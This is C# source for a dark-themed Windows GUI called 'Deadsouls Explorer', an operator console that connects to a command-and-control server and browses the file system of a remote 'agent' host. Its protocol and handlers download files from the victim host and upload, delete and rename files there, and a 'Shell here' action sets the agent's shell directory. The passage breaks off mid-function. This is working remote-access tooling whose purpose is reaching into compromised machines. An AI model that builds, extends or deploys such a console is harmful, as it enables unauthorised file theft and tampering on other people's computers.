// =====================================================================
//  DEADSOULS EXPLORER - GUI file browser for a Deadsouls agent
//  WinForms (.NET Framework 4.x, compiles with csc.exe)
//  Professional dark theme + real system icons (SHGetFileInfo).
//
//  Build: csc /nologo /target:winexe /optimize /out:DeadsoulsExplorer.exe
//         DeadsoulsExplorer.cs
//         /r:System.dll /r:System.Core.dll /r:System.Windows.Forms.dll
//         /r:System.Drawing.dll
//  Run:   DeadsoulsExplorer.exe <browsePort> <sid>
//
//  Connects to the C2's local browse server (started by 'explore <id>').
//  Protocol (text lines, LF-terminated):
//    UI->C2:  LIST|<path>    DL|<remote>|<local>   UL|<local>|<remote>
//             RM|<path>      RN|<src>|<dst>        CD|<dir>        BYE
//    C2->UI:  listing lines ... "END" | "ERR|<msg>" | "OK" | "OK|<cwd>"
//             transfer: "PG|<bytes>" ... "DONE" | "ERR|<msg>"
// =====================================================================
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace DeadsoulsExplorer
{
    // =================================================================
    // THEME - dark professional palette
    // =================================================================
    static class Theme
    {
        // lighter dark palette - soft slate gray-blue, high contrast text
        public static readonly Color Panel       = Color.FromArgb(0x2A, 0x2A, 0x35);
        public static readonly Color Toolbar     = Color.FromArgb(0x32, 0x32, 0x3F);
        public static readonly Color StatusBar   = Color.FromArgb(0x32, 0x32, 0x3F);
        public static readonly Color TreeBg      = Color.FromArgb(0x26, 0x26, 0x2F);
        public static readonly Color ListBg      = Color.FromArgb(0x26, 0x26, 0x2F);
        public static readonly Color ListBgAlt   = Color.FromArgb(0x2C, 0x2C, 0x38);
        public static readonly Color HeaderTop   = Color.FromArgb(0x3A, 0x3A, 0x4A);
        public static readonly Color HeaderBottom= Color.FromArgb(0x30, 0x30, 0x3D);
        public static readonly Color Text        = Color.FromArgb(0xF2, 0xF2, 0xF6);
        public static readonly Color Dim         = Color.FromArgb(0xA9, 0xA9, 0xBE);
        public static readonly Color Accent      = Color.FromArgb(0x8F, 0xB0, 0xFF);
        public static readonly Color Selection   = Color.FromArgb(0x4A, 0x5A, 0x9A);
        public static readonly Color Hover       = Color.FromArgb(0x35, 0x35, 0x4A);
        public static readonly Color Line        = Color.FromArgb(0x44, 0x44, 0x5A);
        public static readonly Color Danger      = Color.FromArgb(0xFF, 0x6B, 0x6B);
    }

    // =================================================================
    // DARK COLOR TABLE for ToolStrip / StatusStrip
    // =================================================================
    class DarkTable : ProfessionalColorTable
    {
        public override Color ToolStripGradientBegin   { get { return Theme.Toolbar; } }
        public override Color ToolStripGradientMiddle  { get { return Theme.Toolbar; } }
        public override Color ToolStripGradientEnd     { get { return Theme.Toolbar; } }
        public override Color ToolStripBorder          { get { return Theme.Line; } }
        public override Color ButtonSelectedGradientBegin   { get { return Theme.Hover; } }
        public override Color ButtonSelectedGradientMiddle  { get { return Theme.Hover; } }
        public override Color ButtonSelectedGradientEnd     { get { return Theme.Hover; } }
        public override Color ButtonPressedGradientBegin    { get { return Theme.Selection; } }
        public override Color ButtonPressedGradientMiddle   { get { return Theme.Selection; } }
        public override Color ButtonPressedGradientEnd      { get { return Theme.Selection; } }
        public override Color MenuBorder               { get { return Theme.Line; } }
        public override Color SeparatorDark            { get { return Theme.Line; } }
        public override Color SeparatorLight           { get { return Theme.Toolbar; } }
        public override Color StatusStripGradientBegin { get { return Theme.StatusBar; } }
        public override Color StatusStripGradientEnd   { get { return Theme.StatusBar; } }
    }

    // =================================================================
    // TOOLBAR GLYPHS - small hand-drawn icons (white on dark)
    // =================================================================
    static class Glyphs
    {
        const int S = 18; // glyph canvas size (matches toolbar ImageScalingSize)
        public static Image Make(Action<Graphics> draw)
        {
            var bmp = new Bitmap(S, S);
            using (var g = Graphics.FromImage(bmp))
            {
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.Clear(Color.Transparent);
                draw(g);
            }
            return bmp;
        }
        public static Image Up() { return Make(g => { using (var p = Pen()) g.DrawLines(p, new Point[] { new Point(4, 12), new Point(9, 5), new Point(14, 12) }); }); }
        public static Image Home() { return Make(g => { using (var p = Pen()) { g.DrawLines(p, new Point[] { new Point(3, 9), new Point(9, 3), new Point(15, 9) }); g.DrawLine(p, 4, 8, 4, 15); g.DrawLine(p, 14, 8, 14, 15); g.DrawLine(p, 4, 15, 14, 15); g.DrawLine(p, 8, 15, 8, 10); g.DrawLine(p, 8, 10, 10, 10); g.DrawLine(p, 10, 10, 10, 15); } }); }
        public static Image Refresh() { return Make(g => { using (var p = Pen()) { g.DrawArc(p, 3, 3, 12, 12, -30, 330); g.DrawLine(p, 10, 2, 14, 3); g.DrawLine(p, 12, 7, 14, 3); } }); }
        public static Image Download() { return Make(g => { using (var p = Pen()) { g.DrawLine(p, 9, 2, 9, 11); g.DrawLines(p, new Point[] { new Point(5, 8), new Point(9, 12), new Point(13, 8) }); g.DrawLine(p, 3, 16, 15, 16); } }); }
        public static Image Upload() { return Make(g => { using (var p = Pen()) { g.DrawLine(p, 9, 11, 9, 2); g.DrawLines(p, new Point[] { new Point(5, 5), new Point(9, 1), new Point(13, 5) }); g.DrawLine(p, 3, 16, 15, 16); } }); }
        public static Image Delete() { return Make(g => { using (var p = Pen(Theme.Danger)) { g.DrawLine(p, 4, 4, 14, 14); g.DrawLine(p, 14, 4, 4, 14); } }); }
        public static Image Rename() { return Make(g => { using (var p = Pen()) { g.DrawLines(p, new Point[] { new Point(13, 3), new Point(16, 6), new Point(6, 16), new Point(3, 13), new Point(13, 3) }); g.DrawLine(p, 2, 17, 3, 13); g.DrawLine(p, 2, 17, 6, 16); } }); }
        public static Image Shell() { return Make(g => { using (var p = Pen()) { g.DrawLines(p, new Point[] { new Point(3, 4), new Point(8, 9), new Point(3, 14) }); g.DrawLine(p, 10, 14, 15, 14); } }); }
        static Pen Pen(Color? c = null) { return new Pen(c ?? Color.White, 2) { StartCap = LineCap.Round, EndCap = LineCap.Round }; }
    }

    // =================================================================
    // SYSTEM ICONS - real folder/drive/file icons via SHGetFileInfo
    // =================================================================
    static class SysIcons
    {
        const uint SHGFI_ICON = 0x100, SHGFI_SMALLICON = 0x1, SHGFI_USEFILEATTRIBUTES = 0x10, SHGFI_TYPENAME = 0x400;
        const uint FILE_ATTRIBUTE_DIRECTORY = 0x10, FILE_ATTRIBUTE_NORMAL = 0x80;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]  public string szTypeName;
        }

        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);
        [DllImport("user32.dll")]
        static extern bool DestroyIcon(IntPtr hIcon);

        static ImageList _small = new ImageList();
        static Dictionary<string, int> _idx = new Dictionary<string, int>();
        static Dictionary<string, string> _typeNames = new Dictionary<string, string>();
        static int _folder = -1, _file = -1, _drive = -1;

        public static ImageList Small { get { return _small; } }

        public static void Init()
        {
            _small.ImageSize = new Size(16, 16);
            _small.ColorDepth = ColorDepth.Depth32Bit;
            _folder = AddIcon("folder", FILE_ATTRIBUTE_DIRECTORY, true);
            _file = AddIcon("file", FILE_ATTRIBUTE_NORMAL, true);
            _drive = AddIcon("C:\\", 0, false);
        }

        static int AddIcon(string path, uint attrs, bool useAttrs)
        {
            var sfi = new SHFILEINFO();
            uint flags = SHGFI_ICON | SHGFI_SMALLICON;
            if (useAttrs) flags |= SHGFI_USEFILEATTRIBUTES;
            IntPtr r = SHGetFileInfo(path, attrs, ref sfi, (uint)Marshal.SizeOf(sfi), flags);
            if (r != IntPtr.Zero && sfi.hIcon != IntPtr.Zero)
            {
                using (var ic = Icon.FromHandle(sfi.hIcon))
                {
                    _small.Images.Add(ic.ToBitmap());
                    DestroyIcon(sfi.hIcon);
                    return _small.Images.Count - 1;
                }
            }
            return 0;
        }

        public static int Folder { get { return _folder; } }
        public static int Drive { get { return _drive; } }

        public static int FileFor(string name)
        {
            string ext = Path.GetExtension(name).ToLowerInvariant();
            if (ext.Length == 0) return _file;
            int i; if (_idx.TryGetValue(ext, out i)) return i;
            i = AddIcon("x" + ext, FILE_ATTRIBUTE_NORMAL, true);
            _idx[ext] = i;
            return i;
        }

        public static string TypeName(string name)
        {
            string ext = Path.GetExtension(name).ToLowerInvariant();
            if (ext.Length == 0) return "File";
            string tn; if (_typeNames.TryGetValue(ext, out tn)) return tn;
            var sfi = new SHFILEINFO();
            uint flags = SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES;
            if (SHGetFileInfo("x" + ext, FILE_ATTRIBUTE_NORMAL, ref sfi, (uint)Marshal.SizeOf(sfi), flags) != IntPtr.Zero
                && !string.IsNullOrEmpty(sfi.szTypeName))
            {
                _typeNames[ext] = sfi.szTypeName;
                return sfi.szTypeName;
            }
            _typeNames[ext] = ext.TrimStart('.') + " file";
            return _typeNames[ext];
        }
    }

    // =================================================================
    // ENTRY
    // =================================================================
    public class Entry
    {
        public string Name, Full, Mtime;
        public long Size;
        public bool IsDir;
        public int Icon;
        public string Type;
        public Entry(string n, string f, long sz, string mt, bool d)
        { Name = n; Full = f; Size = sz; Mtime = mt; IsDir = d; }
    }

    // =================================================================
    // MAIN FORM
    // =================================================================
    public class ExplorerForm : Form
    {
        TcpClient _tc;
        Stream _st;
        readonly object _sendLock = new object();
        int _sid;
        string _cwd = "";

        ListView _lv;
        TreeView _tv;
        ToolStrip _ts;
        ToolStripStatusLabel _status, _selInfo;
        ToolStripProgressBar _prog;
        TextBox _addr;
        List<Entry> _entries = new List<Entry>();
        int _sortCol = 0, _sortAsc = 1;
        int _hoverIdx = -1;

        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length < 2) return;
            int port; if (!int.TryParse(args[0], out port)) return;
            int sid; if (!int.TryParse(args[1], out sid)) return;
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new ExplorerForm(port, sid));
        }

        public ExplorerForm(int port, int sid)
        {
            _sid = sid;
            SysIcons.Init();   // must run before any ImageList is used
            Text = "Deadsouls Explorer  -  agent #" + sid;
            Width = 1000; Height = 650;
            MinimumSize = new Size(760, 480);
            StartPosition = FormStartPosition.CenterScreen;
            BackColor = Theme.Panel;
            ForeColor = Theme.Text;
            Font = new Font("Segoe UI", 9f);

            // add order matters: WinForms docks in REVERSE collection order.
            // body (Fill) must be added FIRST, toolbar (Top) LAST, so the
            // toolbar docks at the top of the form and body fills the rest.
            BuildBody();
            BuildStatus();
            BuildToolbar();
            BuildKeyboard();

            Shown += delegate (object s, EventArgs e) { Connect(port); };
            FormClosing += delegate (object s, FormClosingEventArgs e)
            { try { Send("BYE"); } catch { } try { _tc.Close(); } catch { } };
        }

        // ----------------------------------------------------------------
        // UI construction
        // ----------------------------------------------------------------
        void BuildToolbar()
        {
            _ts = new ToolStrip();
            _ts.Renderer = new ToolStripProfessionalRenderer(new DarkTable());
            _ts.GripStyle = ToolStripGripStyle.Hidden;
            _ts.Padding = new Padding(6, 2, 6, 2);
            _ts.ImageScalingSize = new Size(18, 18);
            _ts.ForeColor = Theme.Text;
            _ts.BackColor = Theme.Toolbar;
            _ts.AutoSize = true;
            _ts.ItemClicked += delegate (object s, ToolStripItemClickedEventArgs e) { _lv.Focus(); };

            _ts.Items.Add(MkBtn("Home", Glyphs.Home(), (s, e) => LoadDir("")));
            _ts.Items.Add(MkBtn("Up", Glyphs.Up(), (s, e) => GoUp()));
            _ts.Items.Add(MkBtn("Refresh", Glyphs.Refresh(), (s, e) => LoadDir(_cwd)));
            _ts.Items.Add(new ToolStripSeparator());
            _ts.Items.Add(MkBtn("Download", Glyphs.Download(), (s, e) => DownloadSelected()));
            _ts.Items.Add(MkBtn("Upload", Glyphs.Upload(), (s, e) => UploadToCurrent()));
            _ts.Items.Add(new ToolStripSeparator());
            _ts.Items.Add(MkBtn("Delete", Glyphs.Delete(), (s, e) => DeleteSelected()));
            _ts.Items.Add(MkBtn("Rename", Glyphs.Rename(), (s, e) => RenameSelected()));
            _ts.Items.Add(new ToolStripSeparator());
            _ts.Items.Add(MkBtn("Shell here", Glyphs.Shell(), (s, e) => ShellHere()));

            _addr = new TextBox();
            _addr.Width = 380;
            _addr.BorderStyle = BorderStyle.FixedSingle;
            _addr.BackColor = Theme.Panel;
            _addr.ForeColor = Theme.Text;
            _addr.Font = new Font("Segoe UI", 9.5f);
            _addr.KeyDown += delegate (object s, KeyEventArgs e)
            { if (e.KeyCode == Keys.Enter) LoadDir(_addr.Text.Trim()); };
            var host = new ToolStripControlHost(_addr) { AutoSize = false, Width = 380 };
            host.Margin = new Padding(14, 3, 4, 3);
            _ts.Items.Add(host);

            _ts.Dock = DockStyle.Top;
            Controls.Add(_ts);
        }

        ToolStripButton MkBtn(string text, Image img, EventHandler onClick)
        {
            var b = new ToolStripButton(text, img, onClick);
            b.DisplayStyle = ToolStripItemDisplayStyle.ImageAndText;
            b.TextImageRelation = TextImageRelation.ImageBeforeText;
            b.AutoSize = true;
            b.Margin = new Padding(1, 2, 1, 2);
            b.Padding = new Padding(5, 0, 6, 0);
            return b;
        }

        void BuildBody()
        {
            var split = new SplitContainer();
            split.Dock = DockStyle.Fill;
            split.BackColor = Theme.Line;
            split.SplitterWidth = 3;
            split.Panel1.BackColor = Theme.TreeBg;
            split.Panel2.BackColor = Theme.ListBg;
            split.Panel1.Padding = new Padding(4);
            split.Panel2.Padding = new Padding(4);
            // min sizes + splitter distance are set on Load, once the
            // container has real dimensions (setting them at construction
            // throws: SplitterDistance must be between the min sizes).
            Load += delegate (object s, EventArgs e)
            {
                split.Panel1MinSize = 180;
                split.Panel2MinSize = 300;
                split.SplitterDistance = 260;
            };

            _tv = new TreeView();
            _tv.Dock = DockStyle.Fill;
            _tv.BackColor = Theme.TreeBg;
            _tv.ForeColor = Theme.Text;
            _tv.LineColor = Theme.Line;
            _tv.HideSelection = false;
            _tv.ImageList = SysIcons.Small;
            _tv.BorderStyle = BorderStyle.None;
            _tv.BeforeExpand += delegate (object s, TreeViewCancelEventArgs e)
            { if (e.Node.Tag is string && e.Node.Nodes.Count == 1 && e.Node.Nodes[0].Tag == null) PopulateNode(e.Node); };
            _tv.AfterSelect += delegate (object s, TreeViewEventArgs e)
            { if (e.Node.Tag is string) LoadDir((string)e.Node.Tag); };
            split.Panel1.Controls.Add(_tv);

            _lv = new ListView();
            _lv.Dock = DockStyle.Fill;
            _lv.View = View.Details;
            _lv.FullRowSelect = true;
            _lv.OwnerDraw = true;
            _lv.SmallImageList = SysIcons.Small;
            _lv.HideSelection = false;
            _lv.BorderStyle = BorderStyle.None;
            _lv.BackColor = Theme.ListBg;
            _lv.ForeColor = Theme.Text;
            _lv.Columns.Add("Name", 300);
            _lv.Columns.Add("Size", 90, HorizontalAlignment.Right);
            _lv.Columns.Add("Type", 140);
            _lv.Columns.Add("Modified", 160);
            _lv.MultiSelect = false;
            _lv.ColumnClick += delegate (object s, ColumnClickEventArgs e)
            {
                if (e.Column == _sortCol) _sortAsc = -_sortAsc;
                else { _sortCol = e.Column; _sortAsc = 1; }
                RebuildList();
            };
            _lv.DoubleClick += delegate (object s, EventArgs e)
            {
                var it = _lv.SelectedItems.Count > 0 ? _lv.SelectedItems[0] : null;
                if (it == null) return;
                int idx = it.Index;
                if (idx >= 0 && idx < _entries.Count && _entries[idx].IsDir) LoadDir(_entries[idx].Full);
            };
            _lv.MouseMove += delegate (object s, MouseEventArgs e)
            {
                var it = _lv.GetItemAt(e.X, e.Y);
                int h = it != null ? it.Index : -1;
                if (h != _hoverIdx)
                {
                    Rectangle r = it != null ? it.Bounds : _lv.ClientRectangle;
                    _lv.Invalidate(r);
                    if (_hoverIdx >= 0 && _hoverIdx < _lv.Items.Count) _lv.Invalidate(_lv.Items[_hoverIdx].Bounds);
                    _hoverIdx = h;
                }
            };
            _lv.MouseLeave += delegate (object s, EventArgs e)
            {
                if (_hoverIdx >= 0 && _hoverIdx < _lv.Items.Count) _lv.Invalidate(_lv.Items[_hoverIdx].Bounds);
                _hoverIdx = -1;
            };
            _lv.DrawColumnHeader += DrawHeader;
            _lv.DrawItem += DrawRow;
            _lv.DrawSubItem += DrawCell;
            _lv.ItemSelectionChanged += delegate (object s, ListViewItemSelectionChangedEventArgs e)
            {
                if (e.IsSelected) UpdateSelInfo(e.ItemIndex);
            };
            split.Panel2.Controls.Add(_lv);

            Controls.Add(split);
        }

        void BuildStatus()
        {
            var ss = new StatusStrip();
            ss.Renderer = new ToolStripProfessionalRenderer(new DarkTable());
            ss.BackColor = Theme.StatusBar;
            ss.ForeColor = Theme.Dim;
            _status = new ToolStripStatusLabel("connecting...") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
            _selInfo = new ToolStripStatusLabel("") { TextAlign = ContentAlignment.MiddleRight };
            _prog = new ToolStripProgressBar();
            _prog.Style = ProgressBarStyle.Continuous;
            ss.Items.Add(_status);
            ss.Items.Add(_selInfo);
            ss.Items.Add(_prog);
            ss.Dock = DockStyle.Bottom;
            Controls.Add(ss);
        }

        void BuildKeyboard()
        {
            KeyPreview = true;
            KeyDown += delegate (object s, KeyEventArgs e)
            {
                if (e.KeyCode == Keys.Back) { GoUp(); e.Handled = true; }
                else if (e.KeyCode == Keys.F5) { LoadDir(_cwd); e.Handled = true; }
                else if (e.KeyCode == Keys.Delete) { DeleteSelected(); e.Handled = true; }
                else if (e.KeyCode == Keys.F2) { RenameSelected(); e.Handled = true; }
                else if (e.Control && e.KeyCode == Keys.D) { DownloadSelected(); e.Handled = true; }
                else if (e.Control && e.KeyCode == Keys.U) { UploadToCurrent(); e.Handled = true; }
                else if (e.Control && e.KeyCode == Keys.L) { _addr.Focus(); _addr.SelectAll(); e.Handled = true; }
            };
        }

        // ----------------------------------------------------------------
        // custom list drawing
        // ----------------------------------------------------------------
        void DrawHeader(object s, DrawListViewColumnHeaderEventArgs e)
        {
            using (var b = new LinearGradientBrush(e.Bounds, Theme.HeaderTop, Theme.HeaderBottom, 90f))
                e.Graphics.FillRectangle(b, e.Bounds);
            using (var p = new Pen(Theme.Line))
                e.Graphics.DrawLine(p, e.Bounds.Right - 1, e.Bounds.Top, e.Bounds.Right - 1, e.Bounds.Bottom);
            string txt = _lv.Columns[e.ColumnIndex].Text;
            if (e.ColumnIndex == _sortCol) txt += _sortAsc > 0 ? "  \u25B2" : "  \u25BC";
            var r = e.Bounds; r.X += 6; r.Width -= 10;
            TextRenderer.DrawText(e.Graphics, txt, _lv.Font, r, Theme.Accent,
                TextFormatFlags.VerticalCenter | TextFormatFlags.Left | TextFormatFlags.NoPrefix | TextFormatFlags.EndEllipsis);
        }

        void DrawRow(object s, DrawListViewItemEventArgs e)
        {
            Color bg = e.Item.Selected ? Theme.Selection : (e.ItemIndex % 2 == 0 ? Theme.ListBg : Theme.ListBgAlt);
            if (!e.Item.Selected && e.ItemIndex == _hoverIdx) bg = Theme.Hover;
            using (var b = new SolidBrush(bg)) e.Graphics.FillRectangle(b, e.Bounds);
            if (e.Item.Selected)
                using (var p = new Pen(Theme.Accent, 2))
                    e.Graphics.DrawLine(p, e.Bounds.Left, e.Bounds.Top, e.Bounds.Left, e.Bounds.Bottom - 1);
        }

        void DrawCell(object s, DrawListViewSubItemEventArgs e)
        {
            Color fg = e.Item.Selected ? Color.White : Theme.Text;
            if (e.ColumnIndex == 0)
            {
                var r = e.Bounds;
                if (e.Item.ImageIndex >= 0 && e.Item.ImageIndex < SysIcons.Small.Images.Count)
                    e.Graphics.DrawImage(SysIcons.Small.Images[e.Item.ImageIndex], r.X + 2, r.Y + (r.Height - 16) / 2, 16, 16);
                r.X += 22; r.Width -= 24;
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, _lv.Font, r, fg,
                    TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis | TextFormatFlags.NoPrefix);
            }
            else
            {
                var r = e.Bounds; r.X += 6; r.Width -= 10;
                Color c = e.Item.Selected ? Color.White : (e.ColumnIndex == 2 ? Theme.Dim : Theme.Text);
                TextFormatFlags f = TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis | TextFormatFlags.NoPrefix;
                if (e.ColumnIndex == 1) f |= TextFormatFlags.Right;
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, _lv.Font, r, c, f);
            }
        }

        // ----------------------------------------------------------------
        // network
        // ----------------------------------------------------------------
        void Connect(int port)
        {
            try
            {
                _tc = new TcpClient("127.0.0.1", port);
                _tc.NoDelay = true;
                _st = _tc.GetStream();
                _status.Text = "connected - loading drives...";
                string root = ListOne("LIST|");
                _tv.BeginUpdate();
                _tv.Nodes.Clear();
                foreach (var ln in root.Split('\n'))
                {
                    string l = ln.TrimEnd('\r');
                    if (l.StartsWith("SPC|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 3) AddNode(p[1], p[2], true, SysIcons.Folder);
                    }
                    else if (l.StartsWith("DRV|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 2) AddNode(p[1], p[1] + "\\", true, SysIcons.Drive);
                    }
                }
                _tv.EndUpdate();
                if (_tv.Nodes.Count > 0)
                {
                    _tv.SelectedNode = _tv.Nodes[0];
                    string tag = _tv.Nodes[0].Tag as string;
                    if (tag != null) LoadDir(tag);
                }
                else LoadDir("");
            }
            catch (Exception ex) { _status.Text = "connect failed: " + ex.Message; }
        }

        void AddNode(string label, string path, bool expandable, int icon)
        {
            var n = new TreeNode(label) { Tag = path, ImageIndex = icon, SelectedImageIndex = icon };
            if (expandable) n.Nodes.Add(new TreeNode("(loading)") { Tag = null });
            _tv.Nodes.Add(n);
        }

        void PopulateNode(TreeNode parent)
        {
            try
            {
                parent.Nodes.Clear();
                string res = ListOne("LIST|" + (string)parent.Tag);
                foreach (var ln in res.Split('\n'))
                {
                    string l = ln.TrimEnd('\r');
                    if (l.StartsWith("D|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 3)
                        {
                            string full = Join((string)parent.Tag, p[1]);
                            var n = new TreeNode(p[1]) { Tag = full, ImageIndex = SysIcons.Folder, SelectedImageIndex = SysIcons.Folder };
                            n.Nodes.Add(new TreeNode("(loading)") { Tag = null });
                            parent.Nodes.Add(n);
                        }
                    }
                }
            }
            catch { }
        }

        void Send(string s)
        {
            lock (_sendLock)
            {
                byte[] b = Encoding.UTF8.GetBytes(s + "\n");
                _st.Write(b, 0, b.Length);
                _st.Flush();
            }
        }

        string ReadLine()
        {
            var sb = new StringBuilder();
            int c;
            while ((c = _st.ReadByte()) >= 0)
            {
                if (c == '\n') break;
                if (c != '\r') sb.Append((char)c);
            }
            if (sb.Length == 0 && c < 0) throw new IOException("closed");
            return sb.ToString();
        }

        string ListOne(string req)
        {
            lock (_sendLock)
            {
                Send(req);
                var sb = new StringBuilder();
                while (true)
                {
                    string l = ReadLine();
                    if (l == "END") return sb.ToString();
                    if (l.StartsWith("ERR|")) return l;
                    sb.AppendLine(l);
                }
            }
        }

        // ----------------------------------------------------------------
        // navigation + sorting
        // ----------------------------------------------------------------
        void LoadDir(string path)
        {
            try
            {
                _cwd = path;
                _status.Text = "listing " + (path.Length == 0 ? "(drives)" : path) + " ...";
                _entries.Clear();
                string res = ListOne("LIST|" + path);
                if (res.StartsWith("ERR|")) { _status.Text = res; _lv.Items.Clear(); return; }
                foreach (var ln in res.Split('\n'))
                {
                    string l = ln.TrimEnd('\r');
                    if (l.StartsWith("PATH|")) { _addr.Text = l.Substring(5); continue; }
                    if (l.StartsWith("SPC|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 3)
                        {
                            var en = new Entry(p[1], p[2], 0, "", true) { Icon = SysIcons.Folder, Type = "Location" };
                            _entries.Add(en);
                        }
                    }
                    else if (l.StartsWith("DRV|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 2)
                        {
                            long free = 0; if (p.Length >= 3) long.TryParse(p[2], out free);
                            var en = new Entry(p[1], p[1] + "\\", free, "", true) { Icon = SysIcons.Drive, Type = "Drive" };
                            _entries.Add(en);
                        }
                    }
                    else if (l.StartsWith("D|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 3)
                        {
                            string full = Join(path, p[1]);
                            var en = new Entry(p[1], full, 0, p[2], true) { Icon = SysIcons.Folder, Type = "Folder" };
                            _entries.Add(en);
                        }
                    }
                    else if (l.StartsWith("F|"))
                    {
                        string[] p = l.Split('|');
                        if (p.Length >= 4)
                        {
                            long sz; long.TryParse(p[2], out sz);
                            string full = Join(path, p[1]);
                            var en = new Entry(p[1], full, sz, p[3], false) { Icon = SysIcons.FileFor(p[1]), Type = SysIcons.TypeName(p[1]) };
                            _entries.Add(en);
                        }
                    }
                }
                RebuildList();
                _status.Text = _entries.Count + " items  -  " + (path.Length == 0 ? "(drives)" : path);
            }
            catch (Exception ex) { _status.Text = "error: " + ex.Message; }
        }

        void RebuildList()
        {
            _entries.Sort(delegate (Entry a, Entry b)
            {
                if (a.IsDir != b.IsDir) return a.IsDir ? -1 : 1;
                int c = 0;
                if (_sortCol == 1) c = a.Size.CompareTo(b.Size);
                else if (_sortCol == 2) c = a.Type.CompareTo(b.Type);
                else if (_sortCol == 3) c = string.Compare(a.Mtime, b.Mtime, StringComparison.Ordinal);
                else c = string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
                return _sortAsc > 0 ? c : -c;
            });

            _lv.BeginUpdate();
            _lv.Items.Clear();
            foreach (var en in _entries)
            {
                var it = new ListViewItem(en.Name, en.Icon);
                it.SubItems.Add(en.IsDir ? "" : HumanSize(en.Size));
                it.SubItems.Add(en.Type);
                it.SubItems.Add(en.Mtime);
                _lv.Items.Add(it);
            }
            _lv.EndUpdate();
            _selInfo.Text = "";
        }

        void UpdateSelInfo(int idx)
        {
            if (idx < 0 || idx >= _entries.Count) { _selInfo.Text = ""; return; }
            var en = _entries[idx];
            if (en.IsDir) _selInfo.Text = "folder";
            else _selInfo.Text = HumanSize(en.Size) + "  (" + en.Size.ToString("N0") + " bytes)";
        }

        void GoUp()
        {
            if (string.IsNullOrEmpty(_cwd)) return;
            string cwd = _cwd.Replace('\\', '/').TrimEnd('/');
            int slash = cwd.LastIndexOf('/');
            string parent = slash > 0 ? cwd.Substring(0, slash) : "";
            LoadDir(parent);
        }

        // join two path segments with forward slashes so the resulting path
        // round-trips correctly on Linux/macOS agents (Windows accepts '/').
        static string Join(string basePath, string name)
        {
            if (string.IsNullOrEmpty(basePath)) return name;
            string b = basePath.Replace('\\', '/');
            return b.EndsWith("/") ? b + name : b + "/" + name;
        }

        // ----------------------------------------------------------------
        // actions
        // ----------------------------------------------------------------
        Entry Selected()
        {
            if (_lv.SelectedItems.Count == 0) return null;
            int idx = _lv.SelectedItems[0].Index;
            if (idx < 0 || idx >= _entries.Count) return null;
            return _entries[idx];
        }

        void DownloadSelected()
        {
            var e = Selected();
            if (e == null || e.IsDir) { _status.Text = "select a file to download"; return; }
            var dlg = new SaveFileDialog();
            dlg.FileName = e.Name;
            dlg.Filter = "All files (*.*)|*.*";
            if (dlg.ShowDialog(this) != DialogResult.OK) return;
            try
            {
                SetBusy("downloading " + e.Full + " ...");
                Send("DL|" + e.Full + "|" + dlg.FileName);
                while (true)
                {
                    string l = ReadLine();
                    if (l.StartsWith("PG|")) { long n; if (long.TryParse(l.Substring(3), out n)) _prog.Value = (int)(n % 100); }
                    else if (l == "DONE") { _status.Text = "download complete: " + dlg.FileName; break; }
                    else if (l.StartsWith("ERR|")) { _status.Text = "download failed: " + l.Substring(4); break; }
                }
            }
            catch (Exception ex) { _status.Text = "download error: " + ex.Message; }
            finally { SetIdle(); }
        }

        void UploadToCurrent()
        {
            var dlg = new OpenFileDialog();
            dlg.Filter = "All files (*.*)|*.*";
            if (dlg.ShowDialog(this) != DialogResult.OK) return;
            string remote = Join(_cwd.Length == 0 ? "/" : _cwd, Path.GetFileName(dlg.FileName));
            try
            {
                SetBusy("uploading " + Path.GetFileName(dlg.FileName) + " -> " + remote + " ...");
                Send("UL|" + dlg.FileName + "|" + remote);
                while (true)
                {
                    string l = ReadLine();
                    if (l == "DONE") { _status.Text = "upload complete: " + remote; break; }
                    else if (l.StartsWith("ERR|")) { _status.Text = "upload failed: " + l.Substring(4); break; }
                }
                LoadDir(_cwd);
            }
            catch (Exception ex) { _status.Text = "upload error: " + ex.Message; }
            finally { SetIdle(); }
        }

        void DeleteSelected()
        {
            var e = Selected();
            if (e == null) return;
            if (MessageBox.Show(this, "Delete " + e.Full + "?", "Confirm delete", MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
                return;
            Send("RM|" + e.Full);
            string l = ReadLine();
            _status.Text = (l == "OK") ? "deleted: " + e.Full : "delete failed: " + l;
            LoadDir(_cwd);
        }

        void RenameSelected()
        {
            var e = Selected();
            if (e == null) return;
            string nn = Prompt("Rename to:", e.Name);
            if (nn == null || nn.Length == 0) return;
            string dst = Join(Path.GetDirectoryName(e.Full.Replace('\\', '/')), nn);
            Send("RN|" + e.Full + "|" + dst);
            string l = ReadLine();
            _status.Text = (l == "OK") ? "renamed." : "rename failed: " + l;
            LoadDir(_cwd);
        }

        void ShellHere()
        {
            string target = _cwd.Length == 0 ? "/" : _cwd;
            Send("CD|" + target);
            string l = ReadLine();
            if (l.StartsWith("OK|"))
                MessageBox.Show(this, "Agent shell cwd set to:\n" + l.Substring(3) +
